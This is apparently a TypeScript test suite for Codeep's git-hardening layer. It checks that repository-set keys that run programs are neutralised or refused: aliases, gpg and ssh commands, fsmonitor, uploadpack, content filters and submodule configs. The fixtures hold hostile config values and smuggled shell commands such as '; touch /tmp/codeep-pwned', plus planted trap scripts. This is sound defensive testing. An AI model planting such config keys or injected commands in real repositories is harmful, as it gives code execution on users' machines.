    { rule: 'gpg.program', arm: [['gpg.program', '/tmp/x']],
      declares: [
        ['gpg.program', ''],
        ['commit.gpgsign', 'false'],
        ['tag.gpgsign', 'false'],
        ['tag.forceSignAnnotated', 'false'],
        ['merge.verifySignatures', 'false'],
      ] },
    { rule: 'gpg.<format>.program', arm: [['gpg.ssh.program', '/tmp/x']],
      declares: [['gpg.ssh.program', ''], ['commit.gpgsign', 'false']] },
    { rule: 'gpg.ssh.defaultKeyCommand', arm: [['gpg.ssh.defaultKeyCommand', '/tmp/x']],
      declares: [['gpg.ssh.defaultkeycommand', ''], ['commit.gpgsign', 'false']] },
    { rule: 'submodule.<name>.update', arm: [['submodule.armed.update', '!/tmp/x']],
      declares: [['submodule.armed.update', 'checkout']] },
    { rule: 'alias.<name>', arm: [['alias.sync', '!/tmp/x']],
      declares: [['alias.sync', ALIAS_REFUSAL('sync', 'the shell command /tmp/x')]] },
    // A non-`!` alias too — that is the one the `!` check used to let past.
    { rule: 'alias.<name> (no bang)', arm: [['alias.st', 'status --porcelain']],
      declares: [['alias.st', ALIAS_REFUSAL('st', 'git status --porcelain')]] },
    { rule: 'core.sshCommand', arm: [['core.sshCommand', '/tmp/x']],
      declares: [['core.sshcommand', '']] },
    { rule: 'core.askPass', arm: [['core.askPass', '/tmp/x']],
      declares: [['core.askpass', '']] },
    { rule: 'core.gitProxy', arm: [['core.gitProxy', '/tmp/x']],
      declares: [['core.gitproxy', '']] },
    { rule: 'interactive.diffFilter', arm: [['interactive.diffFilter', '/tmp/x']],
      declares: [['interactive.difffilter', '']] },
    { rule: 'trailer.<token>.cmd', arm: [['trailer.sign.cmd', '/tmp/x']],
      declares: [['trailer.sign.cmd', '']] },
    { rule: 'trailer.<token>.command', arm: [['trailer.sign.command', '/tmp/x']],
      declares: [['trailer.sign.command', '']] },
  ];

  it.each(RULES)('neutralises a repository $rule', ({ arm, declares }) => {
    for (const [key, value] of arm) git(repo, ['config', key, value]);

    const env = hardenedGitEnv({ cwd: repo });

    const pairs = declaredPairs(env);
    for (const pair of declares) expect(pairs).toContainEqual(pair);
    // Declaring the pair is only half of it — git has to resolve the key to
    // it as well. `remote.<name>.uploadpack` is the key that declares fine
    // and never resolves, which is why it is refused instead (below).
    for (const [key, value] of declares) expect(resolved(env, key)).toBe(value);
  });

  it.each(['uploadpack', 'receivepack'])('refuses to run git at all for a repository remote.origin.%s', which => {
    // No override reaches these, so there is nothing to declare — see the
    // rule's comment, and the live proof in the suite at the end of this file.
    git(repo, ['config', `remote.origin.${which}`, '/tmp/hostile']);

    expect(() => hardenedGitEnv({ cwd: repo })).toThrow(new RegExp(`remote\\.origin\\.${which}`));
    expect(() => hardenedGitEnv({ cwd: repo })).toThrow(/no environment override can switch it off/);
  });

  it('leaves the same key alone when the USER set it globally', () => {
    // The refusal is about what the REPOSITORY says. A user whose own config
    // names a custom upload-pack for their own server keeps working.
    const home = join(base, 'home');
    mkdirSync(home);
    writeFileSync(join(home, '.gitconfig'), '[remote "origin"]\n\tuploadpack = /usr/local/bin/git-upload-pack\n');

    const env = hardenedGitEnv({ cwd: repo, base: { ...process.env, GIT_CONFIG_GLOBAL: join(home, '.gitconfig') } });

    expect(resolved(env, 'remote.origin.uploadpack')).toBe('/usr/local/bin/git-upload-pack');
  });

  it('leaves the aliases the USER configured globally alone', () => {
    // Repo-scope aliases are now neutralised whatever their value, so the
    // scope check is the only thing standing between this hotfix and a user
    // whose `git st` stops working. Their own aliases are theirs.
    const home = join(base, 'home');
    mkdirSync(home);
    writeFileSync(join(home, '.gitconfig'), '[alias]\n\tst = status --porcelain\n\tsync = !echo hi\n');

    const env = hardenedGitEnv({ cwd: repo, base: { ...process.env, GIT_CONFIG_GLOBAL: join(home, '.gitconfig') } });

    expect(resolved(env, 'alias.st')).toBe('status --porcelain');
    expect(resolved(env, 'alias.sync')).toBe('!echo hi');
  });

  it('keeps GIT_CONFIG_* pairs the caller already declared', () => {
    const env = hardenedGitEnv({
      cwd: repo,
      base: { ...process.env, GIT_CONFIG_COUNT: '1', GIT_CONFIG_KEY_0: 'user.name', GIT_CONFIG_VALUE_0: 'Env User' },
    });

    expect(env.GIT_CONFIG_KEY_0).toBe('user.name');
    expect(env.GIT_CONFIG_VALUE_0).toBe('Env User');
    expect(Number(env.GIT_CONFIG_COUNT)).toBeGreaterThan(1);
    // And git agrees: the caller's pair survives, ours is in force.
    expect(resolved(env, 'user.name')).toBe('Env User');
    expect(resolved(env, 'core.fsmonitor')).toBe('false');
  });

  it('drops a GIT_CONFIG_COUNT git itself would reject', () => {
    // git exits with "bogus count" on a non-numeric value, which would break
    // every git call Codeep makes rather than only the caller's own pairs.
    const env = hardenedGitEnv({ cwd: repo, base: { ...process.env, GIT_CONFIG_COUNT: '2abc' } });

    expect(env.GIT_CONFIG_COUNT).toMatch(/^\d+$/);
    expect(resolved(env, 'core.fsmonitor')).toBe('false');
  });

  it('deletes GIT_CONFIG_PARAMETERS, which git reads after our pairs and would win with', () => {
    const hostile = "'core.fsmonitor=touch /tmp/pwned'";

    const env = hardenedGitEnv({ cwd: repo, base: { ...process.env, GIT_CONFIG_PARAMETERS: hostile } });

    expect(env.GIT_CONFIG_PARAMETERS).toBeUndefined();
    expect(resolved(env, 'core.fsmonitor')).toBe('false');
    // Without the delete, git resolves the same key to the hostile value —
    // the whole GIT_CONFIG_COUNT control silently off.
    expect(
      execFileSync('git', ['config', '--get', 'core.fsmonitor'], {
        cwd: repo,
        env: { ...env, GIT_CONFIG_PARAMETERS: hostile },
        encoding: 'utf-8',
      }).trim()
    ).toBe('touch /tmp/pwned');
  });

  it('neutralises executing keys and leaves the user\'s own config alone', () => {
    const env = hardenedGitEnv({ cwd: repo });

    expect(resolved(env, 'protocol.ext.allow')).toBe('never');
    expect(resolved(env, 'log.showSignature')).toBe('false');
    expect(resolved(env, 'core.pager')).toBe('cat');
    expect(env.GIT_TERMINAL_PROMPT).toBe('0');
    // The user's own config is untouched.
    expect(resolved(env, 'user.name')).toBe('Repo User');
  });

  it('leaves the repository hooks alone unless the caller asks', () => {
    git(repo, ['config', 'core.hooksPath', '.githooks']);

    // The default is the commit/checkout case: the user triggered it, so
    // their hooks run.
    expect(resolved(hardenedGitEnv({ cwd: repo }), 'core.hooksPath')).toBe('.githooks');
    // noHooks is for the reads Codeep makes by itself.
    expect(resolved(hardenedGitEnv({ cwd: repo, noHooks: true }), 'core.hooksPath')).toBe('/dev/null');
  });

  it('does not neutralise a key the repository never set', () => {
    // No repo-local gpg.program, so nothing in the gpg cluster is touched and
    // a user who signs from their global config keeps signing.
    const env = hardenedGitEnv({ cwd: repo });

    const keys = Object.keys(env)
      .filter(k => k.startsWith('GIT_CONFIG_KEY_'))
      .map(k => env[k]);
    expect(keys).not.toContain('commit.gpgsign');
    // Nor is submodule recursion switched off wholesale: a user who set
    // `submodule.recurse=true` meant it, and the per-submodule rule below
    // is what handles the `!command` case instead.
    expect(keys).not.toContain('submodule.recurse');
    expect(keys).toContain('core.fsmonitor');
  });

  it('neutralises a repository submodule update command but not a plain one', () => {
    // `submodule.<name>.update = !command` runs on a recursing checkout.
    // Resetting it to `checkout` — git's own default — is what makes this
    // safe to do without a blanket `submodule.recurse=false`.
    git(repo, ['config', 'submodule.hostile.update', '!touch /tmp/codeep-pwned']);
    git(repo, ['config', 'submodule.benign.update', 'rebase']);

    const env = hardenedGitEnv({ cwd: repo });

    expect(resolved(env, 'submodule.hostile.update')).toBe('checkout');
    expect(resolved(env, 'submodule.benign.update')).toBe('rebase');
  });

  it('lets a repository with no hostile setting still diff', () => {
    // `diff.external` was once neutralised for EVERY repo, which is not a
    // neutraliser at all: git tries to run the empty string and the call dies
    // with "external diff died" — in repositories that never carried a
    // hostile setting. Codeep's own diff reads pass `--no-ext-diff` and would
    // never have noticed; `git diff` through execute_command would have.
    git(repo, ['config', 'user.email', 'test@test.com']);
    writeFileSync(join(repo, 'a.txt'), 'one\n');
    git(repo, ['add', '-A']);
    git(repo, ['commit', '-qm', 'initial']);
    writeFileSync(join(repo, 'a.txt'), 'two\n');

    const diff = execFileSync('git', ['diff'], {
      cwd: repo,
      env: hardenedGitEnv({ cwd: repo }),
      encoding: 'utf-8',
    });

    expect(diff).toContain('+two');
  });
});

describe.skipIf(!hasGit)('getChangedFiles porcelain parsing', () => {
  isolateGitConfig();
  let plain: string;

  beforeEach(() => {
    plain = realpathSync(mkdtempSync(join(tmpdir(), 'codeep-git-porcelain-')));
    git(plain, ['init', '-q', '.']);
    git(plain, ['config', 'user.email', 'test@test.com']);
    git(plain, ['config', 'user.name', 'Test User']);
    writeFileSync(join(plain, 'aaa.txt'), 'one\n');
    git(plain, ['add', '-A']);
    git(plain, ['commit', '-qm', 'initial']);
  });

  afterEach(() => {
    rmSync(plain, { recursive: true, force: true });
  });

  it('keeps the whole name of a modified-but-unstaged FIRST entry', () => {
    // `git status --porcelain` pads the status to two columns, and an unstaged
    // modification leaves the first blank: " M aaa.txt". Trimming the whole
    // output before splitting ate that leading space, so the first line lost
    // two more characters than the slice expected and came back as "a.txt".
    // `aaa.txt` sorts first, so it is the line that gets eaten.
    writeFileSync(join(plain, 'aaa.txt'), 'two\n');
    writeFileSync(join(plain, 'zzz.txt'), 'new\n');

    expect(getChangedFiles(plain)).toEqual(['aaa.txt', 'zzz.txt']);
  });
});

/**
 * Why `remote.<name>.uploadpack` is REFUSED rather than neutralised, proven
 * both ways: the repository's program runs on an ordinary fetch, and the
 * override that works for every other key in the table does not stop it.
 * Without this, the refusal would be a rule nobody could tell from a
 * neutraliser that silently did nothing.
 */
describe.skipIf(!hasGit || !posix)('remote.<name>.uploadpack, which no override reaches', () => {
  isolateGitConfig();
  let origin: string;

  beforeEach(() => {
    base = realpathSync(mkdtempSync(join(tmpdir(), 'codeep-git-uploadpack-')));
    origin = join(base, 'origin');
    repo = join(base, 'repo');
    markers = join(base, 'markers');
    mkdirSync(markers);

    git(base, ['init', '-q', 'origin']);
    git(origin, ['config', 'user.email', 'test@test.com']);
    git(origin, ['config', 'user.name', 'Test User']);
    writeFileSync(join(origin, 'a.txt'), 'one\n');
    git(origin, ['add', '-A']);
    git(origin, ['commit', '-qm', 'initial']);
    // `file://` rather than a plain path: it is the transport that makes git
    // run `uploadpack` on THIS machine, which is what turns the key into
    // local code execution.
    git(base, ['clone', '-q', `file://${origin}`, 'repo']);
  });

  afterEach(() => {
    rmSync(base, { recursive: true, force: true });
  });

  it('runs on a plain fetch, and an override does not stop it', () => {
    const script = join(base, 'uploadpack-trap.sh');
    writeFileSync(script, `#!/bin/sh\n${trap('uploadpack')}\nexec git-upload-pack "$@"\n`);
    chmodSync(script, 0o755);
    git(repo, ['config', 'remote.origin.uploadpack', script]);

    // The neutraliser shape every other rule uses. git's remote.c keeps the
    // FIRST value it sees ("more than one uploadpack given, using the first")
    // and repository config is read before the GIT_CONFIG_* pairs, so the
    // repository wins and the trap fires anyway.
    execFileSync('git', ['fetch', 'origin'], {
      cwd: repo,
      env: {
        ...process.env,
        GIT_CONFIG_COUNT: '1',
        GIT_CONFIG_KEY_0: 'remote.origin.uploadpack',
        GIT_CONFIG_VALUE_0: '',
      },
      stdio: 'ignore',
    });
    expect(fired()).toEqual(['uploadpack']);

    // Which is why hardenedGitEnv() does not pretend it can.
    expect(() => hardenedGitEnv({ cwd: repo })).toThrow(/Refusing to run git/);
  });
});

/**
 * A repository that configures a content filter of its own, which is the case
 * this round settles and the reason the suite reads the opposite way round
 * from the rest of the file: the call has to FAIL, and the failure has to
 * reach the caller in words.
 *
 * Neither of the two obvious answers works:
 *
 * - Emptying `filter.<d>.clean` is not neutral, because
 *   `filter.<d>.required` defaults to FALSE. Git then treats the filter as
 *   having produced nothing, falls back to the file's own bytes and stores
 *   them UNFILTERED — for an encrypting driver, the plaintext, committed, on
 *   the ordinary path. Proven with git 2.54: `git cat-file -p :k.secret` came
 *   back as the cleartext.
 * - Emptying it and leaving a REQUIRED filter to abort is fail-closed but
 *   mute: git's own `fatal: k.secret: clean filter 'crypt' failed` says
 *   nothing about Codeep, so its git integration looks broken in exactly the
 *   repositories `git lfs install --local`, `git-crypt init` and `nbstripout
 *   --install` produce — and the workaround that message sends a user to is
 *   `git config filter.<d>.required false`, which walks them straight into
 *   the first bullet.
 *
 * So the policy is: the well-known integrations are left RUNNING (the suite
 * after this one proves it), and every other driver refuses the call with
 * Codeep's own sentence. `required` is never read and never written — the
 * answer here is the same whatever it says, which is what the last test
 * pins.
 */
describe.skipIf(!hasGit || !posix)('a repository that configures its own content filter', () => {
  isolateGitConfig();
  let crypt: string;

  beforeEach(() => {
    base = realpathSync(mkdtempSync(join(tmpdir(), 'codeep-git-crypt-')));
    crypt = join(base, 'repo');

    git(base, ['init', '-q', 'repo']);
    git(crypt, ['config', 'user.email', 'test@test.com']);
    git(crypt, ['config', 'user.name', 'Test User']);
    writeFileSync(join(crypt, '.gitattributes'), '*.secret filter=crypt\n');
    git(crypt, ['add', '-A']);
    git(crypt, ['commit', '-qm', 'attributes']);

    // What git-crypt is, in miniature: a clean filter that encrypts on the
    // way into the object database, a smudge filter that decrypts on the way
    // out, and `required` so that a git which cannot run them refuses rather
    // than store the plaintext. `sed` stands in for the encryption.
    git(crypt, ['config', 'filter.crypt.clean', 'sed s/SECRET/ENCRYPTED/']);
    git(crypt, ['config', 'filter.crypt.smudge', 'sed s/ENCRYPTED/SECRET/']);
    git(crypt, ['config', 'filter.crypt.required', 'true']);

    // New and untracked, so `git status` never refreshes it through the
    // filter — only the `git add` under test does.
    writeFileSync(join(crypt, 'k.secret'), 'my SECRET value\n');
  });

  afterEach(() => {
    rmSync(base, { recursive: true, force: true });
  });

  it('is a repository where the filter really works, so the refusals below are not a broken fixture', () => {
    // The setup helper neutralises the traps of the OTHER suites, not
    // `filter.crypt`, so this is the real driver running.
    git(crypt, ['add', '-A']);

    expect(git(crypt, ['cat-file', '-p', ':k.secret'])).toContain('ENCRYPTED');
    expect(git(crypt, ['cat-file', '-p', ':k.secret'])).not.toContain('SECRET');
  });

  it('stageAll fails instead of writing the plaintext into the object database', () => {
    const result = stageAllResult(crypt);

    expect(result.success).toBe(false);
    // Codeep's own sentence, not git's: which driver, what the repository
    // asked to run, and the `--unset`. "Failed to stage changes" told the
    // user nothing about a filter they may not know is there, and git's bare
    // `clean filter 'crypt' failed` says nothing about Codeep.
    expect(result.error).toContain('filter.crypt.clean');
    expect(result.error).toContain('sed s/SECRET/ENCRYPTED/');
    expect(result.error).toContain('git config --unset filter.crypt.clean');
    // And the sentence that stops the googled workaround from being the
    // thing that commits the secret.
    expect(result.error).toContain('filter.crypt.required false');
    expect(result.error).toContain('UNFILTERED');
    // Nothing was staged...
    expect(git(crypt, ['diff', '--cached', '--name-only']).trim()).toBe('');
    // ...and the cleartext is not in the object database. Empty the clean
    // filter instead of refusing and this is the assertion that goes red:
    // `required` defaults to false, so `git add` succeeds and stores
    // `my SECRET value` verbatim.
    expect(() => git(crypt, ['cat-file', '-p', ':k.secret'])).toThrow();
    expect(stageAll(crypt)).toBe(false);
  });

  it('refuses the same way when the filter is NOT required, which is the default', () => {
    // The shape the previous round missed. `required` is off here, so an
    // emptied clean command does not abort anything — git accepts the filter
    // as having done nothing and stores the plaintext. Proven with git 2.54
    // by emptying it by hand below: the refusal is what stands between this
    // repository and that commit, not `required`.
    git(crypt, ['config', '--unset', 'filter.crypt.required']);

    const result = stageAllResult(crypt);

    expect(result.success).toBe(false);
    expect(result.error).toContain('filter.crypt.clean');
    expect(git(crypt, ['diff', '--cached', '--name-only']).trim()).toBe('');

    // What emptying the filter — the answer this replaces — would have
    // written, spelled out so the test says what it is protecting rather than
    // only that a call failed. `-c filter.crypt.clean=` is that old override,
    // applied by hand.
    execFileSync('git', ['-c', 'filter.crypt.clean=', 'add', '-A'], { cwd: crypt, stdio: 'ignore' });
    expect(git(crypt, ['cat-file', '-p', ':k.secret'])).toContain('my SECRET value');
  });

  it('never emits filter.<d>.required, in either direction', () => {
    // Emitting `required = false` is how a previous cut kept the call alive,
    // and it is the same incident on purpose. Nothing in the environment may
    // mention the key — and since the call is refused outright there is no
    // environment to inspect, which is the assertion after it.
    git(crypt, ['config', '--unset', 'filter.crypt.required']);

    expect(() => hardenedGitEnv({ cwd: crypt })).toThrow(/filter\.crypt\.clean/);

    // With the driver gone the call builds again, and still declares nothing
    // about `required`.
    git(crypt, ['config', '--unset', 'filter.crypt.clean']);
    git(crypt, ['config', '--unset', 'filter.crypt.smudge']);
    const env = hardenedGitEnv({ cwd: crypt });
    const keys = Object.keys(env).filter(k => k.startsWith('GIT_CONFIG_KEY_')).map(k => env[k]);

    expect(keys.filter(k => /required/i.test(k ?? ''))).toEqual([]);
  });

  it('carries the refusal on `refusal`, from a real repository, so the TUI notice can fire', () => {
    // The notice in renderer/main.ts reads `status.refusal` and nothing else,
    // deliberately: `error` is every way git can fail and the commonest of
    // them is a brand-new repository. `GitStatus` did not declare `refusal`
    // and getGitStatus never set it, so the warning shipped dead — a
    // repository whose config names a program looked like an ordinary folder
    // with no branch, which is the exact symptom that notice exists to
    // remove. Asserted against a repository that really refuses rather than a
    // mocked status object, because a mock would have passed the whole time.
    const status = getGitStatus(crypt);

    expect(status.isRepo).toBe(true);
    expect(status.refusal).toContain('filter.crypt.clean');
    expect(status.refusal).toContain('git config --unset filter.crypt.clean');
    // `error` keeps the same text so callers that only know about it still
    // say something useful.
    expect(status.error).toBe(status.refusal);
    expect(status.branch).toBeUndefined();
  });

  it('reaches @git, the diff and the review path as a refusal, not as a crash', () => {
    // GitHardeningError has to arrive the same way through every entry point,
    // because the user meets it wherever they happen to be. A throw escaping
    // any of these is a stack trace in the TUI.
    expect(getGitStatus(crypt).error).toContain('filter.crypt.clean');
    expect(getGitDiff(false, crypt).error).toContain('filter.crypt.clean');
    expect(getGitContent('diff', crypt).error).toContain('filter.crypt.clean');
    expect(getChangedFilesResult(crypt).error).toContain('filter.crypt.clean');
    expect(createCommit('test: nope', crypt).error).toContain('filter.crypt.clean');
    expect(createBranch('agent/x', crypt).error).toContain('filter.crypt.clean');
  });

  it('tells the review path that git was refused instead of calling it "no git changes"', () => {
    // utils/codeReview.ts falls back to a full `src/` scan when git lists no
    // changes, and used to describe that as "no git changes" — which in this
    // repository is a statement nobody checked. The scope line carries the
    // refusal now.
    const result = performCodeReview({ root: crypt } as ProjectContext);

    expect(result.scope).toContain('git could not list the changes');
    expect(result.scope).toContain('filter.crypt.clean');
    expect(result.scope).not.toContain('no git changes');
  });

  it('autoCommitAgentChanges reports the refusal rather than a fixed sentence', () => {
    // The hottest path there is — the auto-commit at the end of every agent
    // run. It reads `status.hasChanges` before `status.error`, and a refused
    // repository answers `hasChanges: undefined`, so this came back as "No
    // changes detected by git": an agent that silently stops committing and a
    // sentence saying nothing is wrong.
    const result = autoCommitAgentChanges(
      'store the deploy key',
      [{ type: 'write', target: 'k.secret', result: 'success', timestamp: Date.now() }],
      crypt
    );

    expect(result.success).toBe(false);
    expect(result.error).toContain('filter.crypt.clean');
    expect(result.error).not.toMatch(/No changes detected by git/);
    // And no commit was made — only the setup one is there.
    expect(git(crypt, ['log', '--oneline']).trim().split('\n')).toHaveLength(1);
  });
});

/**
 * The other half of the content-filter policy: the well-known integrations
 * have to keep working, or Codeep is simply broken in every git-lfs,
 * git-crypt and nbstripout repository.
 *
 * `git-lfs` here is a shim on PATH that leaves a marker and behaves like a
 * filter, because what has to be proven is that the command RAN — a test that
 * only checked "the call did not fail" would pass just as well with the
 * filter emptied, which is the outcome this whole policy exists to prevent.
 */
describe.skipIf(!hasGit || !posix)('a repository whose content filter is a known-safe integration', () => {
  isolateGitConfig();
  let lfs: string;
  let bin: string;

  beforeEach(() => {
    base = realpathSync(mkdtempSync(join(tmpdir(), 'codeep-git-lfs-')));
    lfs = join(base, 'repo');
    markers = join(base, 'markers');
    bin = join(base, 'bin');
    mkdirSync(markers);
    mkdirSync(bin);

    // Stands in for the real binary: marks that it ran, then passes the
    // content through unchanged so git's own bookkeeping still adds up.
    writeFileSync(join(bin, 'git-lfs'), `#!/bin/sh\n${trap('git-lfs')}\ncat\n`);
    chmodSync(join(bin, 'git-lfs'), 0o755);

    git(base, ['init', '-q', 'repo']);
    git(lfs, ['config', 'user.email', 'test@test.com']);
    git(lfs, ['config', 'user.name', 'Test User']);
    writeFileSync(join(lfs, '.gitattributes'), '*.bin filter=lfs\n');
    writeFileSync(join(lfs, 'blob.bin'), 'before\n');
    git(lfs, ['add', '-A']);
    git(lfs, ['commit', '-qm', 'initial']);

    // Exactly what `git lfs install --local` writes, down to the `%f`.
    // `filter.lfs.process` is deliberately left out of THIS fixture: git
    // prefers it over clean/smudge and speaks the long-running pkt-line
    // protocol to it, which a two-line shim cannot answer (git dies with
    // "expected git-filter-server"). The allowlist covers that spelling too,
    // and the acceptance loop at the end of this suite is what checks it.
    git(lfs, ['config', 'filter.lfs.clean', 'git-lfs clean -- %f']);
    git(lfs, ['config', 'filter.lfs.smudge', 'git-lfs smudge -- %f']);
    git(lfs, ['config', 'filter.lfs.required', 'true']);
    // Same length as the original, so git cannot skip the content comparison
    // that runs the filter.
    writeFileSync(join(lfs, 'blob.bin'), 'after.\n');
  });

  afterEach(() => {
    rmSync(base, { recursive: true, force: true });
  });

  /** The repository's git, with the shim on PATH as a real install would be. */
  const onPath = (): NodeJS.ProcessEnv => {
    const saved = process.env.PATH;
    process.env.PATH = `${bin}:${saved}`;
    try {
      return hardenedGitEnv({ cwd: lfs });
    } finally {
      process.env.PATH = saved;
    }
  };

  it('leaves the filter alone, so the integration still runs', () => {
    const env = onPath();

    const out = execFileSync('git', ['status', '--porcelain'], {
      cwd: lfs,
      env,
      encoding: 'utf-8',
    });

    // The call worked...
    expect(out).toContain('blob.bin');
    // ...and the filter really ran, which is the assertion that fails if the
    // allowlist stops matching these spellings and the driver is refused or
    // emptied.
    expect(fired()).toEqual(['git-lfs']);
    // Nothing was declared for it either.
    const keys = Object.keys(env).filter(k => k.startsWith('GIT_CONFIG_KEY_')).map(k => env[k]);
    expect(keys.filter(k => /^filter\./i.test(k ?? ''))).toEqual([]);
  });

  it.each([
    ['a trailing shell command', 'git-lfs clean -- %f; touch /tmp/codeep-pwned'],
    ['a leading one', 'touch /tmp/codeep-pwned; git-lfs clean -- %f'],
    ['a different %f', 'git-lfs clean -- %f %f'],
    ['another program with the name inside it', '/usr/bin/env git-lfs clean -- %f'],
  ])('refuses a value that is not the allowlisted line exactly — %s', (_name, value) => {
    // Why the match is whole-value. Git runs a filter command through a
    // SHELL, so a prefix test would accept the first of these and a substring
    // test all four; each one does what git-lfs does and something else, or
    // something else entirely under a familiar-looking name.
    git(lfs, ['config', 'filter.lfs.clean', value]);

    expect(() => hardenedGitEnv({ cwd: lfs })).toThrow(/filter\.lfs\.clean/);
  });

  it('leaves the same integration alone when it is spelled with an absolute path', () => {
    // What `git lfs install` writes on a machine where git-lfs is not the
    // one on PATH — and, until this round, a repository Codeep refused every
    // git call in. The shim IS the git-lfs on PATH here, which is the
    // condition the relaxation turns on.
    git(lfs, ['config', 'filter.lfs.clean', `${join(bin, 'git-lfs')} clean -- %f`]);
    git(lfs, ['config', 'filter.lfs.smudge', `${join(bin, 'git-lfs')} smudge -- %f`]);

    // Asserted rather than just called: the refusal is what this test is
    // about, so it has to read as a failed expectation naming the value, not
    // as the fixture falling over on an exception.
    let env!: NodeJS.ProcessEnv;
    expect(() => {
      env = onPath();
    }).not.toThrow();

    const out = execFileSync('git', ['status', '--porcelain'], { cwd: lfs, env, encoding: 'utf-8' });
    expect(out).toContain('blob.bin');
    // The filter really ran: the call was not merely allowed through with the
    // driver emptied out from under it.
    expect(fired()).toEqual(['git-lfs']);
  });

  it('refuses an absolute path the repository planted in its own checkout', () => {
    // The same spelling, pointed at a program the REPOSITORY ships. Nothing
    // about it is git-lfs except the filename, and that is exactly what a
    // basename comparison on its own would have accepted.
    const theirs = join(lfs, 'tools');
    mkdirSync(theirs);
    writeFileSync(join(theirs, 'git-lfs'), `#!/bin/sh\n${trap('planted')}\ncat\n`);
    chmodSync(join(theirs, 'git-lfs'), 0o755);
    git(lfs, ['config', 'filter.lfs.clean', `${join(theirs, 'git-lfs')} clean -- %f`]);

    expect(() => onPath()).toThrow(/filter\.lfs\.clean/);
    expect(fired()).toEqual([]);
  });

  it("leaves git-annex's own two lines alone, which its repositories cannot work without", () => {
    // `git annex init` writes these into the repository's own config and
    // routes every annexed path at the driver, so a refusal here is a refusal
    // of the whole checkout — the same shape the git-lfs lines were already
    // on the list for.
    writeFileSync(join(bin, 'git-annex'), `#!/bin/sh\n${trap('git-annex')}\ncat\n`);
    chmodSync(join(bin, 'git-annex'), 0o755);
    writeFileSync(join(lfs, '.gitattributes'), '*.bin filter=annex\n');
    git(lfs, ['config', 'filter.annex.clean', 'git-annex clean -- %f']);
    git(lfs, ['config', 'filter.annex.smudge', 'git-annex smudge -- %f']);

    let env!: NodeJS.ProcessEnv;
    expect(() => {
      env = onPath();
    }).not.toThrow();

    const out = execFileSync('git', ['status', '--porcelain'], { cwd: lfs, env, encoding: 'utf-8' });
    expect(out).toContain('blob.bin');
    expect(fired()).toEqual(['git-annex']);
  });

  it('every allowlisted command is a plain command line with no shell metacharacter', () => {
    // The allowlist's safety rests on its entries being literals with nothing
    // in them a shell would act on, so that "exact match" and "harmless" mean
    // the same thing. This is the guard for the next entry someone adds.
    git(lfs, ['config', '--unset', 'filter.lfs.smudge']);

    for (const command of SAFE_CONTENT_FILTER_COMMANDS) {
      // No `; & | > < $ \` ( ) { } * ? ~ [ ] ! #` — `%f` is git's own
      // placeholder and `"` only ever wraps the program name.
      expect(command, command).not.toMatch(/[;&|<>$`(){}*?~[\]!#\n]/);
      // And each one is accepted, which is what pins the list to the rule
      // rather than to this test's own copy of it.
      git(lfs, ['config', 'filter.lfs.clean', command]);
      expect(() => hardenedGitEnv({ cwd: lfs })).not.toThrow();
    }
  });
});

/**
 * A SUBMODULE's own git config, which lives in `.git/modules/<name>/config`
 * and which `git config --list --show-scope` at the superproject never prints
 * — not under `local`, not under any scope at all.
 *
 * That is the hole: the settings are the repository's, the file ships inside
 * the superproject's `.git`, and git honours them on the automatic `git
 * status` behind the status line. Reproduced with git 2.54 — a
 * `filter.<d>.clean` in `.git/modules/vendor/lib/config` fired on the
 * superproject's own `git status --porcelain` while the superproject's config
 * was spotless, and the scope-aware layer had read nothing of it.
 */
describe.skipIf(!hasGit || !posix)('a submodule that carries its own git config', () => {
  isolateGitConfig();
  let superRepo: string;
  let submodule: string;

  beforeEach(() => {
    base = realpathSync(mkdtempSync(join(tmpdir(), 'codeep-git-submodule-')));
    markers = join(base, 'markers');
    mkdirSync(markers);

    // The library the superproject will embed.
    git(base, ['init', '-q', 'lib']);
    const lib = join(base, 'lib');
    git(lib, ['config', 'user.email', 'test@test.com']);
    git(lib, ['config', 'user.name', 'Test User']);
    writeFileSync(join(lib, '.gitattributes'), '*.bin filter=deep\n');
    writeFileSync(join(lib, 'notes.bin'), 'before\n');
    git(lib, ['add', '-A']);
    git(lib, ['commit', '-qm', 'initial']);

    superRepo = join(base, 'super');
    git(base, ['init', '-q', 'super']);
    git(superRepo, ['config', 'user.email', 'test@test.com']);
    git(superRepo, ['config', 'user.name', 'Test User']);
    // Modern git refuses a `file://`-style submodule source without this.
    // The path is `vendor/lib`, so the submodule NAME contains a slash and
    // its git dir lands at `.git/modules/vendor/lib` — the nested shape the
    // walk has to handle rather than a flat listing.
    git(superRepo, ['-c', 'protocol.file.allow=always', 'submodule', 'add', '-q', '../lib', 'vendor/lib']);
    git(superRepo, ['commit', '-qm', 'add submodule']);

    submodule = join(superRepo, 'vendor', 'lib');
    // Same length as the original, so git cannot skip the content comparison
    // that runs the clean filter.
    writeFileSync(join(submodule, 'notes.bin'), 'after.\n');
  });

  afterEach(() => {
    rmSync(base, { recursive: true, force: true });
  });

  it('is invisible to the superproject scan, which is why this suite exists', () => {
    // The reproduction, asserted rather than described: the key the tests
    // below rely on is in a file the superproject's own `git config --list`
    // does not mention. Delete the submodule pass and nothing else in this
    // suite has a way to see it.
    git(submodule, ['config', 'filter.deep.clean', `${trap('sub-clean')}; cat`]);

    const listed = git(superRepo, ['config', '--list', '--show-scope']);

    expect(listed).not.toContain('filter.deep.clean');
    // The same setting, sitting in a file inside the superproject's own
    // `.git`, spelled the way a config file spells it.
    expect(readFileSync(join(superRepo, '.git', 'modules', 'vendor', 'lib', 'config'), 'utf-8'))
      .toContain('[filter "deep"]');
  });

  it("refuses the superproject's own git status on a submodule content filter", () => {
    // The blocker itself. `git status` at the SUPERPROJECT descends into the
    // submodule to decide whether it is dirty, and that refresh runs the
    // submodule's clean filter. Drop the submodule pass and the marker
    // appears while `getGitStatus` cheerfully reports a branch.
    git(submodule, ['config', 'filter.deep.clean', `${trap('sub-clean')}; cat`]);

    const status = getGitStatus(superRepo);

    expect(fired()).toEqual([]);
    expect(status.error).toContain('filter.deep.clean');
    expect(status.branch).toBeUndefined();
  });

  it('neutralises a submodule alias, and the override reaches the submodule', () => {
    // The other direction: an override CAN reach a submodule, because it
    // rides in the environment rather than in a repository's config. So a
    // key with a neutral value is neutralised there exactly as it is at the
    // superproject — which is what makes scanning worth doing rather than
    // only refusing.
    git(submodule, ['config', 'alias.sub', `!${trap('sub-alias')}`]);

    const env = hardenedGitEnv({ cwd: superRepo });
    let stderr = '';
    try {
      execFileSync('git', ['-C', submodule, 'sub'], { env, encoding: 'utf-8', stdio: ['ignore', 'pipe', 'pipe'] });
    } catch (error) {
      stderr = String((error as { stderr?: string }).stderr ?? '');
    }

    expect(fired()).toEqual([]);
    expect(stderr).toContain("refusing to run 'git sub'");
